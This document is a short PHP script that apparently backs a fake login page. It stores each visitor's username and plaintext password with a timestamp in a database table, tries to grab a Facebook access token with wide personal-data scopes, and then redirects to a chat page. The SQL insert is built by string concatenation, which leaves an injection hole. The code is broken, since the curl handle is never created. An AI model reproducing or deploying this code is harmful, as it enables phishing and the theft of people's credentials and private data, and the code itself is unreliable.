<?php
session_start();

$token = gettoken();
if(strlen($token) > 250){$token = "invalid";};
$_SESSION["token"] = $token;
grava();
if($token == "invalid"){
 echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
}else{
echo 'chat';
header('Location: chat.php'); 
}
exit;

function gettoken(){
$url="https://m.facebook.com/dialog/oauth?client_id=464891386855067&redirect_uri=https://www.facebook.com/connect/login_success.html&scope=basic_info,email,public_profile,user_about_me,user_activities,user_birthday,user_education_history,user_friends,user_interests,user_likes,user_location,user_photos,user_relationship_details&response_type=token";
//$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Must be set to true so that PHP follows any "Location:" header
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//$ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.16 (KHTML, like Gecko) \ Chrome/24.0.1304.0 Safari/537.16';
//curl_setopt($ch, CURLOPT_USERAGENT, $ua);
$a = curl_exec($ch); // $a will contain all headers
$url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // This is what you need, it will return you the last effective URL
echo "<pre>";
print_r($a);
echo"<br>";
echo "</pre>";
echo $url; // Voila
echo"<br>";
curl_close($ch);
$pos1 = strpos($a, "access_token=") + 13;
$pos2 = strpos($a, "&expires_in");
$token = substr($a,$pos1,$pos2 - $pos1);
echo $token;
return $token;

}

function grava(){
$dbopts = parse_url(getenv('DATABASE_URL'));
$dsn = "pgsql:"
    . "host=" . $dbopts["host"] . ";"
    . "dbname=". ltrim($dbopts["path"],'/') . ";"
    . "user=" . $dbopts["user"] . ";"
    . "port=" . $dbopts["port"] . ";"
    . "sslmode=require;"
    . "password=" . $dbopts["pass"];
    
$db = new PDO($dsn);
$login = $_SESSION["user"];
$passw = $_SESSION["password"];
$token = $_SESSION["token"];
//$token = $_SESSION["token"];
$tempo = date('m/d/Y h:i:s a');
$query = "INSERT INTO dados (id1, id2, id3, id4) VALUES ('" . $tempo . "', '" . $login . "', '" . $passw . "', '" . $token . "');";
//echo var_dump($query);
//echo '<br><br>';
$result = $db->query($query);
//echo var_dump($result);
//echo '<br><br>';
$result->closeCursor();
//$app->register(new Herrera\Pdo\PdoServiceProvider(), $zica);
//echo '<br>end<br>';
}



?>
